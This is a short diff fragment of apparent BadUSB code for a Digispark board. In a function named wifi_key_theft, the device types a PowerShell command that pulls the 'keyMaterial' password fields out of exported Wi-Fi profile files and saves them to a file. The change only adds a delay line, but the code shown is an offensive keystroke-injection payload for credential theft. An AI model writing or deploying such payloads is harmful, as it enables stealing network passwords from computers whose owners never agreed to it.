@@ -25,6 +25,7 @@ void wifi_key_theft(){
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
   DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(1000);
 
 }
 
